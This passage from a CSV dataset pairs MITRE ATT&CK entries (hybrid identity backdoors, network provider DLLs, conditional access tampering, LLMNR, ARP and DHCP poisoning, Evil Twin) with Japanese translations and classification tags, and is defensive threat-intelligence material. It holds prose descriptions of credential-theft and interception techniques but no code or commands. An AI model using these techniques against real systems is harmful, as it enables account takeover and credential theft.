攻撃者の範囲、目的、権限によっては、MFA防御が個別アカウントに対して無効化される場合もあれば、被害者ネットワーク環境内の全ドメインアカウントなど、より大規模なグループに紐づく全アカウントに対して無効化される場合もあります。(引用元: Russians Exploit Default MFA Protocol - CISA March 2022),credential-access;defense-evasion;persistence,Windows;SaaS;IaaS;Linux;macOS;Office Suite;Identity Provider,config_policy_manipulation,credential_gain,authentication_system;mfa_in_use;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc,2022-05-31T19:31:38.431Z,2025-04-15T19:58:59.338Z,,,,
T1556.007,T1556,Hybrid Identity,ハイブリッドID,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts. Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity): * Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud * Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory * Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users Eidentity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb) In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",攻撃者は、オンプレミスユーザーIDに紐づくクラウド認証プロセスにパッチ適用、改変、またはバックドアを仕掛けることで、通常の認証メカニズムを迂回し、認証情報を取得し、アカウントへの持続的アクセスを可能にする。多くの組織では、オンプレミス環境とクラウド環境間で共有されるハイブリッドユーザーIDおよびデバイスIDを維持している。これらは様々な方法で管理可能である。例えばMicrosoft Entra IDでは、Active DirectoryとEntra ID間のID同期に3つのオプションを提供する（引用元: Azure AD ハイブリッド ID）:* パスワードハッシュ同期 (PHS): 特権を持つオンプレミスアカウントが Active Directory と Entra ID 間でユーザーパスワードハッシュを同期し、Entra ID への認証を完全にクラウド側で実行可能にする* パススルー認証 (PTA): Entra ID 認証要求をオンプレミスの PTA エージェントに転送し、Active Directory に対して資格情報を検証する* Active Directory フェデレーション サービス (AD FS)。Active Directory と Entra ID 間に信頼関係が確立されます。AD FS は AWS や GCP などの他の SaaS およびクラウド プラットフォームでも使用でき、認証プロセスを AD FS に引き渡し、ハイブリッド ユーザーの Eidentity と特権を含むトークンを受け取ります。ハイブリッド ID に関連する認証プロセスを変更することで、攻撃者はクラウド リソースへの永続的な特権アクセスを確立できる可能性があります。 例えば、PTAエージェントを実行するオンプレミスサーバーを侵害した攻撃者は、`AzureADConnectAuthenticationAgentService`プロセスに悪意のあるDLLを注入し、Entra IDへの認証試行をすべて許可するとともに、ユーザー資格情報を記録させることが可能です。(引用元: Azure AD Connect for Read Teamers)(引用元: AADInternals Azure AD On-Prem to Cloud) AD FSを使用する環境では、攻撃者が`Microsoft.IdentityServer.Servicehost`設定ファイルを改ざんし、任意のクレームを持つユーザー向けの認証トークンを生成する悪意のあるDLLをロードすることで、多要素認証や定義済みのAD FSポリシーを迂回できる可能性があります。（引用元：MagicWeb）場合によっては、攻撃者がクラウドからハイブリッドID認証プロセスを変更できる可能性があります。 例えば、Entra IDテナントのグローバル管理者アカウントを侵害した攻撃者は、Webコンソール経由で新しいPTAエージェントを登録できる可能性があり、同様に資格情報を収集し、任意のユーザーとしてEntra ID環境にログインできるようになります。（引用元：Mandiant Azure AD Backdoors）,credential-access;defense-evasion;persistence,Windows;SaaS;IaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;saas_in_use;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f,2022-09-28T13:29:53.354Z,2025-04-15T22:40:10.913Z,,,,
T1556.008,T1556,Network Provider DLL,ネットワークプロバイダー DLL,"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify) Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",攻撃者は、認証プロセス中に平文のユーザー認証情報を取得するために、悪意のあるネットワークプロバイダーダイナミックリンクライブラリ（DLL）を登録する可能性があります。ネットワークプロバイダーDLLは、Windowsが特定のネットワークプロトコルとインターフェースすることを可能にし、追加の認証情報管理機能もサポートできます。（引用元：Network Provider API）ログオンプロセス中、Winlogon（対話型ログオンモジュール）はRPCを介してローカルの`mpnotify.exe`プロセスに認証情報を送信します。 `mpnotify.exe`プロセスは、ログオンイベント発生を通知する際、登録済みの認証情報管理者と平文の認証情報を共有します。(引用: NPPSPY - Huntress)(引用: NPPSPY Video)(引用: NPLogonNotify) 攻撃者は、`mpnotify.exe`から認証情報を受信するよう悪意のあるネットワークプロバイダーDLLを設定できます。(引用: NPPSPY) 悪意のあるDLLは、認証情報マネージャーとして(レジストリ経由で)インストールされると、`NPLogonNotify()`関数を通じて、ユーザーがWindowsワークステーションまたはドメインにログオンするたびに認証情報を受信・保存できます。(引用元: NPLogonNotify) 攻撃者は、サーバーやドメインコントローラーなど、ログオン活動や管理者ログオン活動が増加していることが知られているシステムを標的に、悪意のあるネットワークプロバイダーDLLを仕込む可能性があります。(引用元: NPPSPY - Huntress),credential-access;defense-evasion;persistence,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--90c4a591-d02d-490b-92aa-619d9701ac04,2023-03-30T22:45:00.431Z,2025-04-15T22:51:56.379Z,,,,
T1556.009,T1556,Conditional Access Policies,条件付きアクセスポリシー,"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource. For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",攻撃者は、侵害されたアカウントへの永続的なアクセスを可能にするため、条件付きアクセスポリシーを無効化または改変する可能性があります。条件付きアクセスポリシーとは、IDプロバイダーやID/アクセス管理システムがリソースへのアクセス許可を判断するために使用する追加の検証手段です。例えば、Entra ID、Okta、JumpCloudでは、ユーザーのIPアドレス、デバイスの登録状態、多要素認証の使用状況に基づいてアプリケーションへのアクセスを拒否できます。(引用元: Microsoft 条件付きアクセス)(引用元: JumpCloud 条件付きアクセスポリシー)(引用元: Okta 条件付きアクセスポリシー) 場合によっては、IDプロバイダーはリスクベースの指標の使用もサポートし、様々な指標に基づいてサインインを拒否することがあります。 AWSとGCPでは、IAMポリシーに`condition`属性を設定でき、ソースIP、リクエスト日時、要求リソース/リージョンの性質など任意の制約条件を検証できます。(引用: AWS IAM Conditions)(引用: GCP IAM Conditions) これらの対策により、侵害された認証情報によるデータ/リソースへの不正アクセスを防止し、ユーザー権限を必要最小限に制限できます。 条件付きアクセスポリシーを変更することで（例：信頼済みIP範囲の追加、[多要素認証](https://attack.mitre.org/techniques/T1556/006)要件の削除、追加の[未使用/非サポートクラウドリージョン](https://attack.mitre.org/techniques/T1535)の許可）、 攻撃者はアカウントへの持続的なアクセスを確保し、防御策を回避できる可能性があります。,credential-access;defense-evasion;persistence,IaaS;Identity Provider,credential_abuse,credential_gain,authentication_system;mfa_in_use;identity_federation;user_interaction;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae,2024-01-02T13:43:37.389Z,2025-04-15T22:09:03.621Z,,,,
T1557,,Adversary-in-the-Middle,中間者攻撃,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics) For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att) Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",攻撃者は中間者攻撃（AiTM）手法を用いて、2つ以上のネットワーク接続デバイス間に自身を配置し、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)、 [送信データ改ざん](https://attack.mitre.org/techniques/T1565/002)、またはリプレイ攻撃 ([認証情報取得のための悪用](https://attack.mitre.org/techniques/T1212)) などの後続行動を支援する可能性があります。 ネットワークトラフィックの流れを決定できる一般的なネットワークプロトコルの機能（例：ARP、DNS、LLMNRなど）を悪用することで、攻撃者はデバイスを攻撃者が制御するシステム経由で通信させ、情報を収集したり追加のアクションを実行したりすることが可能になります。(引用元: Rapid7 MiTM Basics) 例えば、攻撃者は被害者のDNS設定を操作し、正当なサイトへのアクセスを妨害・リダイレクトしたり、追加のマルウェアを配布したりするなどの悪意ある活動を可能にします。(引用元: ttint_rat)(引用元: dns_changer_trojans)(引用元: ad_blocker_with_miner) 攻撃者はまた、DNSを操作し、その立場を利用して、アクセストークン（[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)）やセッションクッキー（[Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)）を含むユーザー認証情報を傍受することもある。(引用: volexity_0day_sophos_FW)(引用: Token tactics) [ダウングレード攻撃](https://attack.mitre.org/techniques/T1562/010) も、より安全性の低い、廃止された、または脆弱なバージョンの通信プロトコル (SSL/TLS) や暗号化アルゴリズムをネゴシエートするなど、AiTM の位置を確立するために使用される可能性があります。(引用: mitm_tls_downgrade_att)(引用: taxonomy_downgrade_att_tls)(引用: tlseminar_downgrade_att)攻撃者は、[送信データの改ざん](https://attack.mitre.org/techniques/T1565/002) など、トラフィックの監視や変更を試みるために AiTM の位置を利用することもあります。 敵対者は、トラフィックが適切な宛先に到達するのを妨げるために、AiTM に類似した位置を設定することができ、その結果、[防御機能の妨害](https://attack.mitre.org/techniques/T1562) や [ネットワークサービス拒否攻撃](https://attack.mitre.org/techniques/T1498) を支援する可能性があります。,credential-access;collection,Windows;macOS;Linux;Network Devices,credential_abuse,asset_access,authentication_system;mfa_in_use;user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0009,attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d,2020-02-11T19:07:12.114Z,2025-04-15T19:58:02.209Z,,,,
T1557.001,T1557,LLMNR/NBT-NS Poisoning and SMB Relay,LLMNR/NBT-NSポイズニングとSMB中継,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS) Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",LLMNR/NBT-NS ネットワークトラフィックに応答することで、攻撃者は名前解決の権威あるソースを偽装し、攻撃者が制御するシステムとの通信を強制する可能性があります。この活動は、認証情報の収集や中継に利用される可能性があります。 リンクローカルマルチキャスト名前解決（LLMNR）とNetBIOS名前サービス（NBT-NS）は、ホスト識別のための代替手段として機能するMicrosoft Windowsコンポーネントである。LLMNRはドメインネームシステム（DNS）形式に基づいており、同一ローカルリンク上のホストが他のホストの名前解決を実行することを可能にする。NBT-NSは、NetBIOS名によってローカルネットワーク上のシステムを識別する。 (出典: Wikipedia LLMNR)(出典: TechNet NetBIOS) 攻撃者は、要求されたホストの身元を知っているかのように振る舞い、LLMNR (UDP 5355)/NBT-NS (UDP 137) トラフィックに応答することで、被害者ネットワーク上の名前解決の権威あるソースを偽装できます。これによりサービスが汚染され、被害者が攻撃者が制御するシステムと通信するようになります。 要求されたホストが識別/認証を必要とするリソースに属する場合、ユーザー名と NTLMv2 ハッシュが敵対者が制御するシステムに送信されます。 攻撃者は、通信を監視するツールや[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を通じて送信されたハッシュ情報を収集し、[ブルートフォース](https://attack.mitre.org/techniques/T1110)でオフライン解読を行い平文パスワードを取得できる。 システム間の認証パス上に存在するシステムへのアクセス権を攻撃者が保持している場合、または認証情報を使用した自動スキャンが攻撃者制御システムへの認証を試みる場合、NTLMv1/v2ハッシュが傍受され、標的システムへのアクセスやコード実行を目的として中継される可能性があります。 この中継ステップはポイズニングと連動して発生する可能性もあるが、独立して実行される場合もある。（引用元: byt3bl33d3r NTLM Relaying）（引用元: Secure Ideas SMB Relay）さらに、攻撃者はNTLMv1/v2ハッシュをLDAP、SMB、MSSQL、HTTPなどの各種プロトコルにカプセル化し、有効なNTLM応答を用いて複数のサービスを拡張・悪用することが可能である。 ローカルネットワーク内のネームサービスをポイズンするために、NBNSpoof、Metasploit、[Responder](https://attack.mitre.org/software/S0174)などのツールが使用されることがある。(引用: GitHub NBNSpoof)(引用: Rapid7 LLMNR Spoofer)(引用: GitHub Responder),credential-access;collection,Windows,credential_abuse,asset_access,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;database_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0009,attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e,2020-02-11T19:08:51.677Z,2025-04-15T22:44:23.234Z,,,,
T1557.002,T1557,ARP Cache Poisoning,ARPキャッシュポイズニング,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache. An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment. The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver) Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)",攻撃者は、2つ以上のネットワーク接続デバイス間の通信の間に割り込むために、アドレス解決プロトコル（ARP）キャッシュを汚染する可能性があります。 この活動は、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040) や [送信データ改ざん](https://attack.mitre.org/techniques/T1565/002) といった後続の行為を可能にするために利用される可能性がある。 ARPプロトコルは、IPv4アドレスをリンク層アドレス（メディアアクセス制御（MAC）アドレスなど）に変換するために使用される（出典: RFC826 ARP）。ローカルネットワークセグメント内のデバイスは、リンク層アドレスを使用して相互通信を行う。ネットワークデバイスが特定のネットワークデバイスのリンク層アドレスを知らない場合、IPアドレスをMACアドレスに変換するためにローカルネットワークにブロードキャストARPリクエストを送信することがある。 関連するIPアドレスを持つデバイスは、自身のMACアドレスを直接返信します。ARPリクエストを送信したネットワークデバイスは、その情報を使用するとともにARPキャッシュに保存します。攻撃者は、ARPリクエストを受動的に待ち受け、リクエスト元のデバイスのARPキャッシュを汚染することが可能です。攻撃者は自身のMACアドレスで返信し、被害者に意図したネットワークデバイスと通信していると思わせることにより欺くことができます。 攻撃者がARPキャッシュを汚染するには、正当なIPアドレス所有者よりも迅速に応答する必要があります。攻撃者はまた、特定のIPアドレスの所有権を悪意を持って宣言する無用なARP応答をローカルネットワークセグメント内の全デバイスに送信することもあります。ARPプロトコルはステートレスであり、認証を必要としません。そのため、デバイスは誤ってIPアドレスのMACアドレスをARPキャッシュに追加または更新する可能性があります。(引用: Sans ARP Spoofing Aug 2003)(引用: Cylance Cleaver)攻撃者は、ネットワークトラフィックを傍受する手段としてARPキャッシュポイズニングを利用することがあります。この活動は、特に安全でない非暗号化プロトコルで送信される認証情報などのデータを収集および/または中継するために使用される可能性があります。(引用: Sans ARP Spoofing Aug 2003),credential-access;collection,Linux;Windows;macOS,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0009,attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213,2020-10-15T12:05:58.755Z,2025-04-15T21:43:10.406Z,,,,
T1557.003,T1557,DHCP Spoofing,DHCPスプーフィング,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 1. The client broadcasts a `DISCOVER` message. 2. The server responds with an `OFFER` message, which includes an available network address. 3. The client broadcasts a `REQUEST` message, which includes the network address offered. 4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters. Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network. DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations. Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",攻撃者は、動的ホスト構成プロトコル（DHCP）トラフィックを偽装し、被害者ネットワーク上で悪意のあるDHCPサーバーとして振る舞うことで、ネットワークトラフィックを攻撃者所有のシステムへリダイレクトする可能性があります。中間者攻撃（AiTM）の立場を獲得することで、攻撃者はネットワーク通信（特に安全でない暗号化されていないプロトコルで送信されるものを含む）や、通過する認証情報を収集する可能性があります。 これにより、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040) や [送信データ改ざん](https://attack.mitre.org/techniques/T1565/002) などの追随的な行動も可能となる。 DHCPはクライアント・サーバーモデルに基づき、2つの機能を有する：DHCPサーバーからクライアントへのネットワーク設定提供プロトコルと、クライアントへのネットワークアドレス割り当てメカニズムである。(引用: rfc2131) 典型的なサーバー-クライアントのやり取りは以下の通り：1. クライアントが`DISCOVER`メッセージをブロードキャストする。2. サーバーが利用可能なネットワークアドレスを含む`OFFER`メッセージで応答する。3. クライアントは提供されたネットワークアドレスを含む`REQUEST`メッセージをブロードキャストする。4. サーバーは`ACK`メッセージで応答し、クライアントはネットワーク設定パラメータを受信する。攻撃者は被害者ネットワーク上で不正なDHCPサーバーを装い、正当なホストが悪意のあるネットワーク設定を受信する可能性がある。 例えば、マルウェアがDHCPサーバーを装い、被害コンピュータに攻撃者が所有するDNSサーバーを提供することが可能である。(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) 悪意のあるネットワーク設定を通じて、攻撃者はAiTM（攻撃者制御トラフィック転送）の立場を獲得し、クライアントトラフィックを攻撃者制御システム経由でルーティングし、クライアントネットワークから情報を収集できる。 DHCPv6クライアントは、<code>INFORMATION-REQUEST (code 11)</code>メッセージを<code>All_DHCP_Relay_Agents_and_Servers</code>マルチキャストアドレスに送信することで、IPアドレスを割り当てられずにネットワーク構成情報を受信できます。(引用: rfc3315) 攻撃者は、不正なDHCPサーバーを使用して、この要求メッセージに悪意のあるネットワーク構成で応答することがあります。 攻撃者はAiTMポジションを確立する代わりに、DHCPスプーフィングを悪用してDHCP枯渇攻撃（すなわち[サービス枯渇フラッド](https://attack.mitre.org/techniques/T1499/002)）を実行し、多数のブロードキャストDISCOVERメッセージを生成してネットワークのDHCP割り当てプールを枯渇させることも可能です。,credential-access;collection,Linux;Windows;macOS,credential_abuse,asset_access,authentication_system;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0009,attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5,2022-03-24T19:30:56.727Z,2025-04-15T22:13:20.292Z,,,,
T1557.004,T1557,Evil Twin,Evil Twin,"Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia ‘Evil Twin E By using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin) Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin) A Wi-Fi Pineapple  Ea network security auditing and penetration testing tool  Emay be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. Similarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin) Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network. Upon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.",攻撃者は、一見正当なWi-Fiアクセスポイントをホストし、ユーザーを欺いて悪意のあるネットワークに接続させることで、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)、 [送信データ改ざん](https://attack.mitre.org/techniques/T1565/002)、または[入力キャプチャ](https://attack.mitre.org/techniques/T1056)といった後続行為を支援する手段として用いる。(引用: オーストラリア「Evil Twin E) 偽のWi-Fiアクセスポイントは、正規のWi-Fiネットワークのサービスセット識別子(SSID)を使用することで、デバイスやユーザーを騙して悪意のあるWi-Fiネットワークに接続させることがあります。(引用元: Kaspersky evil twin)(引用元: medium evil twin) 攻撃者は、より強い信号強度を提供したり、Wi-Fi アクセスポイントへのアクセスをブロックしたりして、被害者のデバイスを悪意のあるネットワークに接続させるよう強制または誘導する場合があります。(引用: specter ops evil twin) Wi-Fi Pineapple  Eネットワークセキュリティ監査および侵入テストツール  